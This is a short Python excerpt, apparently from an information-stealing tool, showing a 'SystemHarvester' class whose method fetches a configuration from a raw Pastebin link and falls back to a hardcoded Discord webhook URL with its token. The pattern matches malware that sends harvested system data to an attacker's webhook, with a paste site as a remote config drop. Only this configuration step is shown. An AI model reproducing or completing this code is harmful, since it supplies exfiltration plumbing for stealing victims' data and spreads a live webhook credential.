...
class SystemHarvester:
    ...
    def fetch_config(self):
        try:
            pastebin_url = "https://pastebin.com/raw/gCMXUg7w"
            response = requests.get(pastebin_url)
            return response.text.strip()
        except:
            return "https://discord.com/api/webhooks/1438308693346226197/GZuGev6brdXzZVuBNbl4Tu-y6dGfjGw0osDb5aNS_JheFZSjE_d01VsGtNlJBoL-Q6wy"
